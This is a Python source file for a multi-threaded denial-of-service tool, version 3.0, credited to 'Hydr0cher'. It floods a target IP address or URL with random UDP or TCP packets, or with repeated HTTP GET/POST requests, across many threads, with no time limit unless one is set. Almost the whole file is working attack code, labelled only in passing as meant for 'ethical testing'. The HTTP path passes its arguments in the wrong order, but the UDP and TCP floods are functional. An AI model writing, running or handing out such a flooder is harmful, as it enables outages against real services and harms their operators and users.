import socket
import random
import threading
import argparse
import logging
import time
import requests
from urllib.parse import urlparse

__author__ = "Hydr0cher"
__version__ = "3.0"
__copyright__ = "Copyright (C) 2024 Hydr0cher. All rights reserved."
__license__ = "MIT License"

# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="Advanced DDoS script for ethical testing purposes.")
    parser.add_argument("target", type=str, help="Target IP address or URL")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of attacking threads (default: 10)")
    parser.add_argument("-s", "--size", type=int, default=1024, help="Size of packet payload (default: 1024 bytes)")
    parser.add_argument("-d", "--duration", type=int, default=None, help="Duration of the attack in seconds (default: None, indefinite)")
    parser.add_argument("-p", "--protocol", choices=["tcp", "udp", "http"], default="udp", help="Protocol to use for the attack (default: udp)")
    parser.add_argument("-r", "--request-path", type=str, default="/", help="HTTP request path (default: /)")
    parser.add_argument("-m", "--method", choices=["GET", "POST"], default="GET", help="HTTP method (default: GET)")
    return parser.parse_args()

# Function to resolve URL to IP address
def resolve_target_url(target):
    try:
        parsed_url = urlparse(target)
        if parsed_url.scheme not in ['http', 'https']:
            raise argparse.ArgumentTypeError("Invalid URL scheme. Only HTTP/HTTPS supported.")

        ip_address = socket.gethostbyname(parsed_url.hostname)
        return ip_address
    except socket.gaierror:
        raise argparse.ArgumentTypeError(f"Failed to resolve hostname: {parsed_url.hostname}")
    except Exception as e:
        raise argparse.ArgumentTypeError(f"Invalid URL: {e}")

# Function to send UDP packets to the target
def udp_ddos(target_ip, target_port, packet_size, duration=None):
    start_time = time.time()
    while True:
        try:
            # Create a socket and connect to the target
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target_ip, target_port))

            # Generate a random payload
            payload = random._urandom(packet_size)

            # Send the packet to the target
            s.send(payload)
            
            # Close the socket
            s.close()
            logging.info(f"UDP Packet sent to {target_ip}:{target_port} with size {packet_size}")

            # Check if duration is specified and break the loop if attack duration is reached
            if duration and time.time() - start_time >= duration:
                break

        except socket.error as e:
            logging.error(f"Socket error: {e}")
        except Exception as e:
            logging.error(f"Error: {e}")

# Function to send TCP packets to the target
def tcp_ddos(target_ip, target_port, packet_size, duration=None):
    start_time = time.time()
    while True:
        try:
            # Create a socket and connect to the target
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))

            # Generate a random payload
            payload = random._urandom(packet_size)

            # Send the packet to the target
            s.send(payload)
            
            # Close the socket
            s.close()
            logging.info(f"TCP Packet sent to {target_ip}:{target_port} with size {packet_size}")

            # Check if duration is specified and break the loop if attack duration is reached
            if duration and time.time() - start_time >= duration:
                break

        except socket.error as e:
            logging.error(f"Socket error: {e}")
        except Exception as e:
            logging.error(f"Error: {e}")

# Function to send HTTP requests to the target
def http_ddos(target_ip, target_port, request_path, method, packet_size, duration=None):
    url = f"http://{target_ip}:{target_port}{request_path}"

    start_time = time.time()
    while True:
        try:
            if method == "GET":
                response = requests.get(url)
            elif method == "POST":
                response = requests.post(url, data={"payload": random._urandom(packet_size)})

            logging.info(f"HTTP {method} request sent to {url} with size {packet_size}, status code: {response.status_code}")

            # Check if duration is specified and break the loop if attack duration is reached
            if duration and time.time() - start_time >= duration:
                break

        except requests.RequestException as e:
            logging.error(f"HTTP request error: {e}")
        except Exception as e:
            logging.error(f"Error: {e}")

# Main function
def main():
    # Configure logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # Parse command-line arguments
    args = parse_arguments()

    # Resolve the target IP address if the target is a URL
    if args.protocol == "http":
        target_ip = resolve_target_url(args.target)
    else:
        target_ip = args.target

    # Log the start of the attack
    logging.info(f"Starting {args.protocol.upper()} DDoS attack on {args.target}:{args.target_port} with {args.threads} threads and {args.size} byte payloads")

    # Select the appropriate DDoS function based on the protocol
    if args.protocol == "udp":
        attack_function = udp_ddos
    elif args.protocol == "tcp":
        attack_function = tcp_ddos
    elif args.protocol == "http":
        attack_function = http_ddos
    else:
        logging.error("Unsupported protocol. Choose 'tcp', 'udp', or 'http'.")
        return

    # Start attacking threads
    thread_list = []
    try:
        for i in range(args.threads):
            thread = threading.Thread(target=attack_function, args=(target_ip, args.target_port, args.size, args.duration))
            thread_list.append(thread)
            thread.start()
            logging.info(f"Thread {i+1} started")

        # Wait for all threads to complete
        for thread in thread_list:
            thread.join()

    except KeyboardInterrupt:
        logging.info("Attack interrupted. Exiting...")

if __name__ == "__main__":
    main()
